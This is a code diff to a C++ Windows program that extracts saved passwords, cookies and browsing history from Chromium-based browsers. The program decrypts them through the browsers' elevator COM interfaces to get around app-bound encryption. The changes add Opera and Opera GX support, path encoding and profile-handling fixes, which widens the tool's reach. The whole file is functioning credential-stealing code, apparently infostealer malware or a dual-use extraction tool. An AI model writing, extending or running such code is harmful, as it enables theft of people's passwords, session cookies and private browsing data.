@@ -12,6 +12,8 @@
 #include "sqlite3.h"
 #include "json.hpp"
 #include <bcrypt.h>
+#include <iomanip>
+#include <sstream>
 
 using json = nlohmann::json;
 namespace fs = std::filesystem;
@@ -53,7 +55,7 @@ std::string ensure_utf8(const std::string& input) {
     return output;
 }
 
-enum class Browser { Chrome, Edge, Brave };
+enum class Browser { Chrome, Edge, Brave, Opera, OperaGX };
 
 struct PasswordData { std::string url, username, password; };
 struct CookieData {
@@ -121,7 +123,8 @@ std::vector<unsigned char> decrypt_with_elevator(const std::vector<unsigned char
     std::vector<GUID> iids;
     if (browser == Browser::Chrome) { clsid = CLSID_CHROME_ELEVATOR; iids = { IID_CHROME_IELEVATOR2, IID_CHROME_IELEVATOR1 }; }
     else if (browser == Browser::Edge) { clsid = CLSID_EDGE_ELEVATOR; iids = { IID_EDGE_IELEVATOR2, IID_EDGE_IELEVATOR1 }; }
-    else { clsid = CLSID_BRAVE_ELEVATOR; iids = { IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1 }; }
+    else if (browser == Browser::Brave) { clsid = CLSID_BRAVE_ELEVATOR; iids = { IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1 }; }
+    else return {}; // Opera uses DPAPI only for now
 
     HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
     if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return {};
@@ -264,7 +267,14 @@ bool copy_file_locked(const fs::path& source, const fs::path& dest) {
 int open_db_readonly(const std::string& path, sqlite3** db) {
     std::string norm_path = path;
     std::replace(norm_path.begin(), norm_path.end(), '\\', '/');
-    std::string uri = "file:" + norm_path + "?mode=ro&nolock=1";
+
+    std::string encoded_path;
+    for (char c : norm_path) {
+        if (c == ' ') encoded_path += "%20";
+        else encoded_path += c;
+    }
+
+    std::string uri = "file:" + encoded_path + "?mode=ro&nolock=1";
     return sqlite3_open_v2(uri.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI | SQLITE_OPEN_NOMUTEX, nullptr);
 }
 
@@ -275,6 +285,8 @@ Browser get_browser() {
     std::transform(s.begin(), s.end(), s.begin(), ::towlower);
     if (s.find(L"msedge.exe") != std::wstring::npos) return Browser::Edge;
     if (s.find(L"brave.exe") != std::wstring::npos) return Browser::Brave;
+    if (s.find(L"opera gx") != std::wstring::npos) return Browser::OperaGX;
+    if (s.find(L"opera") != std::wstring::npos) return Browser::Opera;
     return Browser::Chrome;
 }
 
@@ -297,7 +309,9 @@ void do_work() {
         fs::path data_path;
         if (browser == Browser::Chrome) data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
         else if (browser == Browser::Edge) data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
-        else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
+        else if (browser == Browser::Brave) data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
+        else if (browser == Browser::Opera) data_path = user_profile / "AppData/Roaming/Opera Software/Opera Stable";
+        else if (browser == Browser::OperaGX) data_path = user_profile / "AppData/Roaming/Opera Software/Opera GX Stable";
 
         log_to_file("Data path: " + data_path.string());
 
@@ -331,9 +345,16 @@ void do_work() {
             log_to_file("v20 key retrieval: " + std::string(v20_key.empty() ? "FAILED" : "SUCCESS"));
         }
 
-        std::vector<std::string> profiles = { "Default" };
-        for (const auto& entry : fs::directory_iterator(data_path)) {
-            if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) profiles.push_back(entry.path().filename().string());
+        std::vector<std::string> profiles;
+        if (browser == Browser::Opera || browser == Browser::OperaGX) {
+            profiles.push_back(".");
+        } else {
+            profiles.push_back("Default");
+            if (fs::exists(data_path)) {
+                for (const auto& entry : fs::directory_iterator(data_path)) {
+                    if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) profiles.push_back(entry.path().filename().string());
+                }
+            }
         }
 
         json collected = json::array();
@@ -346,7 +367,7 @@ void do_work() {
             log_to_file("Processing profile: " + profile);
             fs::path p_path = data_path / profile;
             ProfileData p_data;
-            p_data.name = profile;
+            p_data.name = (profile == ".") ? "Main" : profile;
 
             // Passwords
             fs::path db_path = p_path / "Login Data";
@@ -441,7 +462,7 @@ void do_work() {
                             while (sqlite3_step(stmt) == SQLITE_ROW) {
                                 const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
                                 const char* t_title = (const char*)sqlite3_column_text(stmt, 1);
-                                p_data.history.push_back({ t_url ? t_url : "", t_title ? t_title : "", sqlite3_column_int(stmt, 2) });
+                                p_data.history.push_back({ t_url ? t_url : "", t_title ? t_title : "", (int)sqlite3_column_int(stmt, 2) });
                             }
                             sqlite3_finalize(stmt);
                         }
